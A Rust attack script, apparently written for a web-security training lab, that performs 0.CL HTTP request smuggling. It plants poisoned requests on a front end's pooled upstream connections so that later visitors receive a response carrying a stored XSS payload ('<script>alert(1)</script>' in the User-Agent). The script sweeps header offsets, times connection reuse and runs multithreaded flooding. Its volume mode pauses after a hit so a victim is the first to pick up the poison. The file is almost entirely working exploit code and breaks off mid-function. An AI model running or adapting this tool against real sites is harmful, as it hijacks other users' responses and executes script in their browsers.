#!/usr/bin/env rust-script
//! name: pool_window
//! description: 0.CL 上游池回收时序探针 - 在同一前端打毒(A 带全小写 `content-length : C` 让后端吃体,B 的头块被吃、体内依次是 filler + 两条完整请求(revealed 与盈余发,都带载荷 UA) + 一条截断的 smuggled 请求),随即优雅关闭或闲置攻击连接,再以全新连接在给定延迟档发带信标查询串的探针,逐档分类回执(状态行/字节/首末 Content-Type/残留帖子页/XSS 载荷回显/SVG 缺失)判定「毒化上游连接能否被后到连接继承」;plant 按同一毒化反复种植;cycles 先静默过上游 keepalive 超时再单发种植(空池时 A/B 只能同连接);volume 多线程量击,可 --c-list 轮转偏移电池、首发命中即 --cool-after-prime-ms 全局静默把首取机会留给受害者,末尾读横幅。
//! version: 1.1.0
//! args: <base-url> --mode sweep|window|plant|cycles|volume [--c N] [--c-list a,b,c] [--c-delta 35] [--cl-from N] [--cl-to N] [--cl-step N] [--filler-crlf N] [--delays 500,1000,2000,3000,5000,8000,12000] [--reps N] [--rounds N] [--seconds N] [--workers N] [--jitter-ms N] [--hold close|idle|both] [--post-id 1] [--seed-id 2] [--ua PAYLOAD] [--salt S] [--gadget-prefix P] [--cache-path P] [--idle-secs N] [--settle-secs N] [--cool-after-prime-ms N] [--banner-every N] [--probe-every N] [--probe-delays ms,ms] [--probe-if-primed] [--drain-ms 900] [--probe-ms 3000] [--probe-retries 2] [--victim-wait-ms 6000] [--brief] [--banner] [--dump] [--no-read] [--selftest]
//! keywords: smuggling, 0cl, desync, response-queue, pool, reuse, timing, xss, tls
//!
//! ```cargo
//! [dependencies]
//! rustls = "0.23"
//! webpki-roots = "0.26"
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{json, Value};
use pi_rust_lib::timeout;
use std::collections::HashMap;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};
use url::Url;

type Tls = rustls::StreamOwned<rustls::ClientConnection, TcpStream>;

fn connect(host: &str, port: u16) -> Result<Tls, String> {
    let mut roots = rustls::RootCertStore::empty();
    roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
    let config = rustls::ClientConfig::builder().with_root_certificates(roots).with_no_client_auth();
    let name = rustls::pki_types::ServerName::try_from(host.to_string()).map_err(|e| format!("sni: {e}"))?;
    let tcp = TcpStream::connect((host, port)).map_err(|e| format!("connect: {e}"))?;
    let _ = tcp.set_nodelay(true);
    let conn = rustls::ClientConnection::new(Arc::new(config), name).map_err(|e| format!("tls: {e}"))?;
    let mut s = rustls::StreamOwned::new(conn, tcp);
    {
        let rustls::StreamOwned { conn, sock } = &mut s;
        conn.complete_io(sock).map_err(|e| format!("handshake: {e}"))?;
    }
    s.sock.set_read_timeout(Some(Duration::from_millis(120))).map_err(|e| format!("timeout: {e}"))?;
    Ok(s)
}

/// Graceful TLS shutdown (close_notify) so the front-end sees an orderly close
/// and may return its upstream connection to the pool instead of tearing it down.
fn graceful_close(mut s: Tls) {
    s.conn.send_close_notify();
    let rustls::StreamOwned { conn, sock } = &mut s;
    let _ = conn.complete_io(sock);
    drop(s);
}

fn drain(s: &mut Tls, total_ms: u64, idle_ms: u64) -> Vec<u8> {
    let start = Instant::now();
    let mut buf: Vec<u8> = Vec::new();
    let mut last = Instant::now();
    let mut chunk = [0u8; 16384];
    loop {
        timeout::check();
        if start.elapsed() >= Duration::from_millis(total_ms) {
            break;
        }
        match s.read(&mut chunk) {
            Ok(0) => break,
            Ok(n) => {
                buf.extend_from_slice(&chunk[..n]);
                last = Instant::now();
            }
            Err(_) => {
                if !buf.is_empty() && last.elapsed() >= Duration::from_millis(idle_ms) {
                    break;
                }
                if buf.is_empty() && idle_ms == 0 {
                    break;
                }
            }
        }
    }
    buf
}

fn classify(buf: &[u8], ua: &str) -> Value {
    let text = String::from_utf8_lossy(buf).to_string();
    let mut statuses: Vec<String> = Vec::new();
    for (off, _) in text.match_indices("HTTP/1.") {
        let rest = &text[off..];
        let end = rest.find("\r\n").unwrap_or(rest.len());
        let line = &rest[..end];
        let mut it = line.split(' ');
        let ver = it.next().unwrap_or("");
        let code = it.next().unwrap_or("");
        if ver.starts_with("HTTP/1.") && code.len() == 3 && code.chars().all(|c| c.is_ascii_digit()) {
            statuses.push(line.to_string());
        }
    }
    let post_page = text.contains("Leave a comment") || text.contains("name=\"userAgent\"") || text.contains("name=userAgent");
    let total = text.chars().count();
    let tail: String = text.chars().skip(total.saturating_sub(300)).collect();
    // 末条 Content-Type:两发以上时它就是第二个响应的类型(text/html = 残留被当成帖子页)
    let mut ct = String::new();
    let mut ct1 = String::new();
    for (off, _) in text.match_indices("Content-Type:") {
        let rest = &text[off + 13..];
        let end = rest.find("\r\n").unwrap_or(rest.len());
        let v = rest[..end].trim();
        if !v.is_empty() {
            if ct1.is_empty() {
                ct1 = v.to_string();
            }
            ct = v.to_string();
        }
    }
    json!({
        "bytes": buf.len(),
        "statuses": statuses,
        "status_count": statuses.len(),
        "post_page": post_page,
        "xss_hit": text.contains("<script>alert"),
        "ct": ct,
        "ct1": ct1,
        "svg": text.contains("<svg") || text.contains("image/svg"),
        "ua_echo": !ua.is_empty() && text.contains(ua),
        "head": text.chars().take(120).collect::<String>(),
        "tail": tail,
    })
}

/// A probe is clean when it looks like the plain cache-path resource: one 200,
/// SVG bytes present, no leaked post page.
fn probe_clean(v: &Value) -> bool {
    v["status_count"].as_u64() == Some(1)
        && v["statuses"][0].as_str().unwrap_or("").contains(" 200 ")
        && v["svg"].as_bool().unwrap_or(false)
        && !v["post_page"].as_bool().unwrap_or(false)
        && !v["xss_hit"].as_bool().unwrap_or(false)
}

fn arg_val(argv: &[String], key: &str) -> Option<String> {
    let mut i = 0;
    while i < argv.len() {
        if argv[i] == key {
            return argv.get(i + 1).cloned();
        }
        i += 1;
    }
    None
}

fn arg_num<T: std::str::FromStr>(argv: &[String], key: &str, dflt: T) -> T {
    arg_val(argv, key).and_then(|v| v.parse().ok()).unwrap_or(dflt)
}

struct Ctx {
    host: String,
    post_id: String,
    seed_id: String,
    ua: String,
    salt: String,
    filler_crlf: usize,
    gadget: String,
    cache_path: String,
}

/// The attacker pair: A carries the malformed lowercase `content-length : C`
/// (front-end ignores it, back-end eats C bytes of what follows); B is the
/// early-answer gadget request whose header block is what gets eaten, followed
/// by filler CRLFs, a complete revealed request and a truncated smuggled one.
fn build(ctx: &Ctx, c: u64, tag: &str) -> (String, String, usize, usize) {
    let t = format!("GET /post?postId={} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}", ctx.post_id, ctx.host, ctx.ua);
    // r 是「revealed」:它的响应会被前端当 B 的响应收掉;r2 是盈余那发(其响应应落在后端队列里,
    // 由该连接上后到的请求取走)。两者都带载荷 UA,因为哪一发被配对无法预先确定。
    let r = format!("GET /post?postId={} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nConnection: keep-alive\r\n\r\n", ctx.seed_id, ctx.host, ctx.ua);
    let r2 = format!("GET /post?postId={} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nConnection: keep-alive\r\n\r\n", ctx.post_id, ctx.host, ctx.ua);
    let filler = "\r\n".repeat(ctx.filler_crlf);
    let body = format!("{filler}{r}{r2}{t}");
    let m = body.len();
    let gurl_a = format!("{}{}{}", ctx.gadget, ctx.salt, tag);
    let gurl_b = format!("{}?b={}{}", ctx.cache_path, ctx.salt, tag);
    let hdr_b = format!("GET {gurl_b} HTTP/1.1\r\nHost: {}\r\nContent-Length: {m}\r\nConnection: keep-alive\r\n\r\n", ctx.host);
    let a = format!("GET {gurl_a} HTTP/1.1\r\nHost: {}\r\ncontent-length : {c}\r\nConnection: keep-alive\r\n\r\n", ctx.host);
    let b = format!("{hdr_b}{body}");
    (a, b, hdr_b.len(), m)
}

/// One plant attempt: A (early-answer gadget + hidden lowercase `content-length : C`)
/// followed immediately by B (header block + filler/revealed/truncated body). Shared by
/// every mode and safe to call from worker threads.
fn plant_once(
    ctx: &Ctx,
    port: u16,
    drain_ms: u64,
    c_opt: Option<u64>,
    c_delta: u64,
    tag: &str,
    c_over: Option<u64>,
) -> Result<(Value, Tls, u64), String> {
    let (_, _, hl, _) = build(ctx, 0, tag);
    let cc = c_over.or(c_opt).unwrap_or(hl as u64 + c_delta);
    let (a, b, _, _) = build(ctx, cc, tag);
    let mut s = connect(&ctx.host, port)?;
    let both = format!("{a}{b}");
    s.write_all(both.as_bytes()).map_err(|e| e.to_string())?;
    let _ = s.flush();
    let resp = drain(&mut s, drain_ms, 300);
    Ok((classify(&resp, &ctx.ua), s, cc))
}

fn probe_once(ctx: &Ctx, port: u16, probe_ms: u64, path: &str, beacon: &str) -> Result<(Value, bool), String> {
    let mut s = connect(&ctx.host, port)?;
    let pr = probe_req(ctx, path, beacon);
    s.write_all(pr.as_bytes()).map_err(|e| e.to_string())?;
    let _ = s.flush();
    let b = drain(&mut s, probe_ms, 500);
    let empty = b.is_empty();
    Ok((classify(&b, &ctx.ua), empty))
}

fn read_page(ctx: &Ctx, port: u16, read_ms: u64, path: &str) -> Result<Value, String> {
    let mut s = connect(&ctx.host, port)?;
    let req = format!("GET {path} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n", ctx.host);
    s.write_all(req.as_bytes()).map_err(|e| e.to_string())?;
    let _ = s.flush();
    let b = drain(&mut s, read_ms, 400);
    Ok(classify(&b, &ctx.ua))
}

fn probe_req(ctx: &Ctx, path: &str, beacon: &str) -> String {
    format!("GET {path}?{beacon}=1 HTTP/1.1\r\nHost: {}\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n", ctx.host)
}

fn banner_solved(host: &str, port: u16, _ctx: &Ctx) -> Value {
    let req = format!("GET / HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n", host);
    match connect(host, port) {
        Ok(mut s) => {
            let _ = s.write_all(req.as_bytes());
            let _ = s.flush();
            let b = drain(&mut s, 3000, 500);
            let text = String::from_utf8_lossy(&b).to_string();
            json!({
                "bytes": b.len(),
                "is_solved_class": text.contains("is-solved"),
                "post_page": text.contains("Leave a comment") || text.contains("name=userAgent"),
                "congrats": text.contains("Congratulations") || text.contains("congratulations"),
            })
        }
        Err(e) => json!({"error": e}),
    }
}

fn main() {
    let argv: Vec<String> = std::env::args().skip(1).collect();
    if argv.iter().any(|a| a == "--selftest") {
        let ua = "POC</script>";
        let post = classify(b"HTTP/1.1 200 OK\r\n\r\nname=\"userAgent\" <script>alert(1)</script>", ua);
        let css = classify(b"HTTP/1.1 200 OK\r\nContent-Type: image/svg+xml\r\n\r\n<svg></svg>", ua);
        let bad = classify(b"HTTP/1.1 400 Bad Request\r\n\r\n", ua);
        let ok = post["post_page"] == true
            && post["xss_hit"] == true
            && probe_clean(&css)
            && !probe_clean(&post)
            && !probe_clean(&bad)
            && bad["statuses"][0] == "HTTP/1.1 400 Bad Request";
        pi_rust_lib::report::success(
            "pool_window",
            json!({"selftest": if ok {"ok"} else {"fail"}, "post": post, "svg": css, "bad": bad}),
            "classifier + clean-probe oracle are the pure root",
        )
        .unwrap_or(());
        return;
    }
    let mut base = String::new();
    for a in &argv {
        if !a.starts_with("--") {
            base = a.clone();
            break;
        }
    }
    if base.is_empty() {
        pi_rust_lib::report::failure(
            "pool_window",
            "usage: pool_window <base-url> --mode window [--c 300] [--delays 500,1000,...]",
            "pass the lab instance base URL and a mode",
        );
        std::process::exit(2);
    }
    let parsed = Url::parse(&base).unwrap_or_else(|_| Url::parse("https://invalid/").unwrap());
    let host = arg_val(&argv, "--host").unwrap_or_else(|| parsed.host_str().unwrap_or("").to_string());
    let port = parsed.port().unwrap_or(443);
    let mode = arg_val(&argv, "--mode").unwrap_or_else(|| "window".to_string());
    let hold = arg_val(&argv, "--hold").unwrap_or_else(|| "close".to_string());
    let c_opt: Option<u64> = arg_val(&argv, "--c").and_then(|v| v.parse().ok());
    let c_delta: u64 = arg_num(&argv, "--c-delta", 35);
    let probe_retries: u64 = arg_num(&argv, "--probe-retries", 2);
    // 信标长度参与头块长度,而 C 又必须匹配头块长度:所有模式统一用定宽 hex 信标,
    // 这样 sweep 找到的 C 直接适用于 window/plant。
    let tag_len: usize = arg_num(&argv, "--tag-len", 6);
    let mut counter: u64 = 0;
    let filler_crlf: usize = arg_num(&argv, "--filler-crlf", 0);
    let reps: u64 = arg_num(&argv, "--reps", 1);
    let rounds: u64 = arg_num(&argv, "--rounds", 20);
    let drain_ms: u64 = arg_num(&argv, "--drain-ms", 900);
    let probe_ms: u64 = arg_num(&argv, "--probe-ms", 3000);
    let victim_wait_ms: u64 = arg_num(&argv, "--victim-wait-ms", 6000);
    let dump = argv.iter().any(|a| a == "--dump");
    let brief = argv.iter().any(|a| a == "--brief");
    let no_read = argv.iter().any(|a| a == "--no-read");
    let delays: Vec<u64> = arg_val(&argv, "--delays")
        .unwrap_or_else(|| "500,1000,2000,3000,5000,8000,12000".to_string())
        .split(',')
        .filter_map(|v| v.trim().parse().ok())
        .collect();
    let ctx = Ctx {
        host: host.clone(),
        post_id: arg_val(&argv, "--post-id").unwrap_or_else(|| "1".to_string()),
        seed_id: arg_val(&argv, "--seed-id").unwrap_or_else(|| "2".to_string()),
        ua: arg_val(&argv, "--ua").unwrap_or_else(|| "POC</script><script>alert(1)</script>".to_string()),
        salt: arg_val(&argv, "--salt").unwrap_or_else(|| "k".to_string()),
        filler_crlf,
        gadget: arg_val(&argv, "--gadget-prefix").unwrap_or_else(|| "/resources/images/blog.svg?a=".to_string()),
        cache_path: arg_val(&argv, "--cache-path").unwrap_or_else(|| "/resources/images/blog.svg".to_string()),
    };
    let (_, sample_b, sample_hdr, sample_body) = build(&ctx, c_opt.unwrap_or(0), "sample");
    let mut out = json!({
        "url": base, "host": host, "mode": mode, "hold": hold,
        "c_override": c_opt, "c_delta": c_delta, "tag_len": tag_len,
        "filler_crlf": filler_crlf, "b_len": sample_b.len(), "b_header_len": sample_hdr,
        "b_body_len": sample_body, "delays": delays,
    });

    // 偏移是「B 的头块长度 + 前端自己加的字节」:tag 长度一变头块长度就变,
    // 所以窗口/种植两模式按每轮实际头块长度现算 c,不再钉死绝对值。
    let c_list: Option<Vec<u64>> = arg_val(&argv, "--c-list").map(|v| {
        v.split(',').filter_map(|x| x.trim().parse().ok()).collect()
    });
    let plant = |ctx: &Ctx, tag: &str, c_over: Option<u64>| -> Result<(Value, Tls, u64), String> {
        plant_once(ctx, port, drain_ms, c_opt, c_delta, tag, c_over)
    };

    if mode == "sweep" {
        let lo: u64 = arg_num(&argv, "--cl-from", sample_hdr.saturating_sub(30) as u64);
        let hi: u64 = arg_num(&argv, "--cl-to", (sample_hdr + 120) as u64);
        let step: u64 = arg_num(&argv, "--cl-step", 4);
        let mut rows: Vec<Value> = Vec::new();
        let mut boundaries: Vec<u64> = Vec::new();
        let mut c = lo;
        while c <= hi {
            for rep in 0..reps {
                timeout::check();
                let (a, b, hdr_len, body_len) = build(&ctx, c, &format!("{:0width$x}", counter, width = tag_len));
                counter += 1;
                let r = (|| -> Result<Value, String> {
                    let mut s = connect(&host, port)?;
                    let both = format!("{a}{b}");
                    s.write_all(both.as_bytes()).map_err(|e| e.to_string())?;
                    let _ = s.flush();
                    let resp = drain(&mut s, drain_ms, 300);
                    let mut v = classify(&resp, &ctx.ua);
                    if dump {
                        v["raw"] = json!(String::from_utf8_lossy(&resp).chars().take(1000).collect::<String>());
                    }
                    Ok(v)
                })();
                match r {
                    Ok(v) => {
                        let hit = v["post_page"].as_bool().unwrap_or(false);
                        if hit {
                            boundaries.push(c);
                        }
                        let mut row = json!({"c": c, "rep": rep, "hdr_len": hdr_len, "body_len": body_len,
                            "post_page": v["post_page"], "xss_hit": v["xss_hit"], "statuses": v["statuses"], "bytes": v["bytes"], "ct": v["ct"], "ct1": v["ct1"]});
                        if !brief {
                            row["head"] = v["head"].clone();
                            row["tail"] = v["tail"].clone();
                        }
                        rows.push(row);
                    }
                    Err(e) => rows.push(json!({"c": c, "rep": rep, "error": e})),
                }
            }
            c += step;
        }
        out["rows"] = json!(rows);
        out["boundaries"] = json!(boundaries);
        pi_rust_lib::report::success(
            "pool_window",
            out,
            "boundaries lists the C values whose leftover parsed as the revealed post page - that C is the eaten-offset to reuse",
        )
        .unwrap_or(());
        return;
    }

    if mode == "window" {
        // baseline: what a clean probe looks like before any poisoning
        let mut baseline_rows: Vec<Value> = Vec::new();
        for attempt in 0..=probe_retries {
            timeout::check();
            let pr = probe_req(&ctx, &ctx.cache_path, &format!("{}base{attempt}", ctx.salt));
            let r = (|| -> Result<Vec<u8>, String> {
                let mut s = connect(&host, port)?;
                s.write_all(pr.as_bytes()).map_err(|e| e.to_string())?;
                let _ = s.flush();
                Ok(drain(&mut s, probe_ms, 500))
            })();
            match r {
                Ok(b) => {
                    let empty = b.is_empty();
                    let mut v = classify(&b, &ctx.ua);
                    v["attempt"] = json!(attempt);
                    v["clean"] = json!(!empty && probe_clean(&v));
                    v["empty"] = json!(empty);
                    baseline_rows.push(v);
                    if !empty {
                        break;
                    }
                }
                Err(e) => baseline_rows.push(json!({"attempt": attempt, "error": e})),
            }
        }
        out["baseline"] = json!(baseline_rows.clone());

        let passes: Vec<&str> = match hold.as_str() {
            "both" => vec!["close", "idle"],
            "idle" => vec!["idle"],
            _ => vec!["close"],
        };
        let mut rows: Vec<Value> = Vec::new();
        let mut traces: u64 = 0;
        let mut primes: u64 = 0;
        let mut idle_kept: Vec<Tls> = Vec::new();
        for pass in passes {
            for delay in &delays {
                for rep in 0..reps {
                    timeout::check();
                    let tag = format!("{:0width$x}", counter, width = tag_len);
                    counter += 1;
                    let (plant_cls, claimed, c_used) = match plant(&ctx, &tag, None) {
                        Ok(v) => v,
                        Err(e) => {
                            rows.push(json!({"pass": pass, "delay_ms": delay, "rep": rep, "error": e}));
                            continue;
                        }
                    };
                    let primed = plant_cls["post_page"].as_bool().unwrap_or(false)
                        || plant_cls["xss_hit"].as_bool().unwrap_or(false);
                    if primed {
                        primes += 1;
                    }
                    // 立即关闭(或闲置)攻击连接,让前端自己决定上游连接的去处
                    if pass == "close" {
                        graceful_close(claimed);
                    } else {
                        idle_kept.push(claimed);
                    }
                    std::thread::sleep(Duration::from_millis(*delay));
                    let mut probes: Vec<Value> = Vec::new();
                    let mut anomalies: u64 = 0;
                    let mut empties: u64 = 0;
                    for hop in 0..2u32 {
                        timeout::check();
                        let beacon = format!("{}p{pass}{delay}{rep}{hop}", ctx.salt);
                        let pr = probe_req(&ctx, &ctx.cache_path, &beacon);
                        let mut attempt: u64 = 0;
                        loop {
                            attempt += 1;
                            timeout::check();
                            let r = (|| -> Result<Vec<u8>, String> {
                                let mut s2 = connect(&host, port)?;
                                s2.write_all(pr.as_bytes()).map_err(|e| e.to_string())?;
                                let _ = s2.flush();
                                Ok(drain(&mut s2, probe_ms, 500))
                            })();
                            match r {
                                Ok(b) => {
                                    let clean = !b.is_empty() && probe_clean(&classify(&b, &ctx.ua));
                                    let mut v = classify(&b, &ctx.ua);
                                    v["hop"] = json!(hop);
                                    v["attempt"] = json!(attempt);
                                    v["clean"] = json!(clean);
                                    v["empty"] = json!(b.is_empty());
                                    if dump {
                                        v["raw"] = json!(String::from_utf8_lossy(&b).chars().take(700).collect::<String>());
                                    }
                                    let empty = b.is_empty();
                                    let retry_more = empty && attempt <= probe_retries;
                                    v["retried"] = json!(retry_more);
                                    probes.push(v);
                                    if retry_more {
                                        continue;
                                    }
                                    if empty {
                                        empties += 1;
                                    } else if !clean {
                                        anomalies += 1;
                                    }
                                    break;
                                }
                                Err(e) => {
                                    probes.push(json!({"hop": hop, "attempt": attempt, "error": e, "clean": false, "empty": false, "retried": attempt <= probe_retries}));
                                    if attempt > probe_retries {
                                        anomalies += 1;
                                        break;
                                    }
                                }
                            }
                        }
                    }
                    // 只有「收到了回执但不是干净资源页」才算被吃字节的痕迹;
                    // 空回执是前端抖动(基线也会空),单列不计。
                    let trace = anomalies > 0;
                    if trace {
                        traces += 1;
                    }
                    rows.push(json!({
                        "pass": pass, "delay_ms": delay, "rep": rep, "c_used": c_used,
                        "plant": plant_cls, "primed": primed,
                        "probes": probes, "anomalies": anomalies, "empties": empties, "trace": trace,
                    }));
                }
            }
        }
        out["rows"] = json!(rows);
        out["traces"] = json!(traces);
        out["primes"] = json!(primes);
        pi_rust_lib::report::success(
            "pool_window",
            out,
            "traces>0 means a fresh connection saw poisoned-upstream bytes (pool inheritance); traces==0 across all delays means the upstream binding is 1:1",
        )
        .unwrap_or(());
        return;
    }

    if mode == "cycles" {
        // 空池-种植周期:先静默 idle-secs 让前端把闲置上游连接超时丢掉(池空),再种一发——
        // 此时 A 与 B 只能落在同一条上游连接上,且该连接是池里唯一的,受害者下一次访问
        // 必然复用它。--probe-if-primed 时即使已种成也发探针(学窗口);默认种成则静默等受害者。
        let rounds: u64 = arg_num(&argv, "--rounds", 6);
        let idle_secs: u64 = arg_num(&argv, "--idle-secs", 62);
        let settle_secs: u64 = arg_num(&argv, "--settle-secs", 12);
        let probe_if_primed = argv.iter().any(|a| a == "--probe-if-primed");
        let mut rows: Vec<Value> = Vec::new();
        let mut priming_c: Vec<u64> = Vec::new();
        let mut solved = false;
        let mut banner_last = Value::Null;
        let mut stop_reason = String::new();
        for round in 0..rounds {
            timeout::check();
            if idle_secs > 0 {
                std::thread::sleep(Duration::from_secs(idle_secs));
            }
            let tag = format!("{:0width$x}", counter, width = tag_len);
            counter += 1;
            let c_this = c_list.as_ref().map(|l| l[round as usize % l.len()]);
            let mut row = json!({"round": round, "idle_secs": idle_secs});
            let mut primed = false;
            match plant(&ctx, &tag, c_this) {
                Ok((cls, claim, c_used)) => {
                    primed = cls["post_page"].as_bool().unwrap_or(false)
                        || cls["xss_hit"].as_bool().unwrap_or(false);
                    if primed {
                        priming_c.push(c_used);
                    }
                    row["c_used"] = json!(c_used);
                    row["plant"] = cls;
                    row["primed"] = json!(primed);
                    graceful_close(claim);
                }
                Err(e) => {
                    row["error"] = json!(e);
                }
            }
            let mut probes: Vec<Value> = Vec::new();
            if !primed || probe_if_primed {
                for d in &delays {
                    timeout::check();
                    std::thread::sleep(Duration::from_millis(*d));
                    let beacon = format!("{}c{round}d{d}", ctx.salt);
                    match probe_once(&ctx, port, probe_ms, &ctx.cache_path, &beacon) {
                        Ok((mut v, empty)) => {
                            v["delay_ms"] = json!(d);
                            v["empty"] = json!(empty);
                            v["clean"] = json!(!empty && probe_clean(&v));
                            probes.push(v);
                        }
                        Err(e) => probes.push(json!({"delay_ms": d, "error": e})),
                    }
                }
            }
            row["probes"] = json!(probes.clone());
            row["probes_skipped"] = json!(primed && !probe_if_primed);
            if settle_secs > 0 {
                std::thread::sleep(Duration::from_secs(settle_secs));
            }
            let b = banner_solved(&host, port, &ctx);
            if b["is_solved_class"].as_bool().unwrap_or(false) || b["congrats"].as_bool().unwrap_or(false) {
                solved = true;
            }
            row["banner"] = b.clone();
            banner_last = b;
            rows.push(row);
            let surplus = probes.iter().any(|p| p["ct1"].as_str() == Some("text/html"));
            if solved {
                stop_reason = "banner".to_string();
                break;
            }
            if surplus {
                stop_reason = "surplus".to_string();
                break;
            }
        }
        out["mode"] = json!("cycles");
        out["rows"] = json!(rows);
        out["priming_c"] = json!(priming_c);
        out["solved"] = json!(solved);
        out["stop_reason"] = json!(stop_reason);
        out["banner"] = banner_last;
        pi_rust_lib::report::success(
            "pool_window",
            out,
            "priming_c lists the C values that planted a live poison; solved=true is the verdict",
        )
        .unwrap_or(());
        return;
    }

    if mode == "volume" {
        // 量击:多线程不间断种植,worker 内循环(单次调用跑完几千发),按节奏错峰探针收割,
        // 定期读横幅;--probe-every 0 时纯种植(窗口已证时用),--banner-every 控制读横幅节奏。
        let workers: u64 = arg_num(&argv, "--workers", 6);
        let seconds: u64 = arg_num(&argv, "--seconds", 240);
        let jitter_ms: u64 = arg_num(&argv, "--jitter-ms", 12);
        let probe_every: u64 = arg_num(&argv, "--probe-every", 20);
        let read_every: u64 = arg_num(&argv, "--read-every", 0);
        let banner_every: u64 = arg_num(&argv, "--banner-every", 300);
        let cool_ms: u64 = arg_num(&argv, "--cool-after-prime-ms", 0);
        let banner_on_prime = argv.iter().any(|a| a == "--banner-on-prime");
        let probe_delays: Vec<u64> = arg_val(&argv, "--probe-delays")
            .unwrap_or_else(|| "300,900,2500".to_string())
            .split(',')
            .filter_map(|v| v.trim().parse().ok())
            .collect();
        let ctx_arc = Arc::new(ctx);
        let counter = Arc::new(AtomicU64::new(0));
        let plants = Arc::new(AtomicU64::new(0));
        let primes = Arc::new(AtomicU64::new(0));
        let traces = Arc::new(AtomicU64::new(0));
        let post_hits = Arc::new(AtomicU64::new(0));
        let hist = Arc::new(Mutex::new(HashMap::<String, u64>::new()));
        let cprimes = Arc::new(Mutex::new(HashMap::<String, u64>::new()));
        let cool = Arc::new(Mutex::new(None::<Instant>));
        let samples = Arc::new(Mutex::new(Vec::<Value>::new()));
        let banner = Arc::new(Mutex::new(Value::Null));
        let deadline = Instant::now() + Duration::from_secs(seconds);
        let mut handles = Vec::new();
        for wid in 0..workers {
            let ctx: Arc<Ctx> = Arc::clone(&ctx_arc);
            let counter = Arc::clone(&counter);
            let plants = Arc::clone(&plants);
            let primes = Arc::clone(&primes);
            let traces = Arc::clone(&traces);
            let post_hits = Arc::clone(&post_hits);
            let hist = Arc::clone(&hist);
            let cprimes = Arc::clone(&cprimes);
            let cool = Arc::clone(&cool);
            let samples = Arc::clone(&samples);
            let banner = Arc::clone(&banner);
            let delays = probe_delays.clone();
            let clist = c_list.clone();
            handles.push(std::thread::spawn(move || {
                let mut local: u64 = 0;
                loop {
                    timeout::check();
                    if Instant::now() >= deadline {
                        break;
                    }
                    // 冷却:刚种下一个可继承的毒时静默几秒,把首取机会留给受害者的周期访问
                    let wait_ms: u64 = {
                        let g = cool.lock().unwrap();
                        match *g {
                            Some(t) => {
                                let now = Instant::now();
                                if t > now { (t - now).as_millis() as u64 } else { 0 }
                            }
                            None => 0,
                        }
                    };
                    if wait_ms > 0 {
                        std::thread::sleep(Duration::from_millis(wait_ms.min(30000)));
                        if banner_on_prime {
                            let b = banner_solved(&ctx.host, port, &ctx);
                            let solved = b["is_solved_class"].as_bool().unwrap_or(false)
                                || b["congrats"].as_bool().unwrap_or(false);
                            if solved {
                                *banner.lock().unwrap() = json!({"at_plants": plants.load(Ordering::SeqCst), "solved": true, "raw": b});
                                break;
                            }
                        }
                        continue;
                    }
                    let n = counter.fetch_add(1, Ordering::SeqCst);
                    let tag = format!("{:0width$x}", n, width = tag_len);
                    let c_use: Option<u64> = clist.as_ref().map(|l| l[(n as usize) % l.len()]);
                    match plant_once(&ctx, port, drain_ms, c_opt, c_delta, &tag, c_use) {
                        Ok((cls, claim, c_used)) => {
                            let primed = cls["post_page"].as_bool().unwrap_or(false)
                                || cls["xss_hit"].as_bool().unwrap_or(false);
                            if primed {
                                primes.fetch_add(1, Ordering::SeqCst);
                                let mut cp = cprimes.lock().unwrap();
                                *cp.entry(format!("{c_used}")).or_insert(0) += 1;
                                if cool_ms > 0 {
                                    let mut g = cool.lock().unwrap();
                                    *g = Some(Instant::now() + Duration::from_millis(cool_ms));
                                }
                            }
                            {
                                let key = format!("n{}|{}|{}", cls["status_count"], cls["ct1"], cls["ct"]);
                                let mut h = hist.lock().unwrap();
                                *h.entry(key).or_insert(0) += 1;
                            }
                            if primed {
                                let mut s = samples.lock().unwrap();
                                if s.len() < 12 {
                                    s.push(json!({"kind": "prime", "tag": tag, "cls": cls.clone()}));
                                }
                            }
                            graceful_close(claim);
                        }
                        Err(e) => {
                            let mut h = hist.lock().unwrap();
                            *h.entry(format!("err:{e}")).or_insert(0) += 1;
                        }
                    }
                    plants.fetch_add(1, Ordering::SeqCst);
                    local += 1;
                    if probe_every > 0 && local % probe_every == 0 {
                        for d in &delays {
                            std::thread::sleep(Duration::from_millis(*d));
                            let beacon = format!("{}v{}d{}", ctx.salt, n, d);
                            if let Ok((v, empty)) = probe_once(&ctx, port, probe_ms, &ctx.cache_path, &beacon) {
                                if !empty && !probe_clean(&v) {
                                    traces.fetch_add(1, Ordering::SeqCst);
                                    let mut s = samples.lock().unwrap();
                                    if s.len() < 12 {
                                        s.push(json!({"kind": "trace", "delay_ms": d, "cls": v}));
                                    }
                                }
                            }
                        }
                    }
                    if read_every > 0 && local % read_every == 0 {
                        let path = format!("/post?postId={}", ctx.post_id);
                        if let Ok(v) = read_page(&ctx, port, probe_ms, &path) {
                            if v["post_page"].as_bool().unwrap_or(false) {
                                post_hits.fetch_add(1, Ordering::SeqCst);
                            }
                        }
                    }
                    if banner_every > 0 && local % banner_every == 0 {
                        let b = banner_solved(&ctx.host, port, &ctx);
                        let solved = b["is_solved_class"].as_bool().unwrap_or(false)
                            || b["congrats"].as_bool().unwrap_or(false);
                        *banner.lock().unwrap() = json!({"at_plants": plants.load(Ordering::SeqCst), "solved": solved, "raw": b});
                        if solved {
                            break;
                        }
                    }
                    if jitter_ms > 0 || wid > 0 {
                        std::thread::sleep(Duration::from_millis(jitter_ms + (wid * 7) % 23));
                    }
                }
            }));
        }
        for h in handles {
            let _ = h.join();
        }
        let plant_n = plants.load(Ordering::SeqCst);
        let prime_n = primes.load(Ordering::SeqCst);
        let trace_n = traces.load(Ordering::SeqCst);
        let banner_v = banner.lock().unwrap().clone();
        let solved = banner_v["solved"].as_bool().unwrap_or(false);
        let final_banner = banner_solved(&host, port, &ctx_arc);
        let solved_final = solved
            || final_banner["is_solved_class"].as_bool().unwrap_or(false)
            || final_banner["congrats"].as_bool().unwrap_or(false);
        out["mode"] = json!("volume");
        out["workers"] = json!(workers);
        out["seconds"] = json!(seconds);
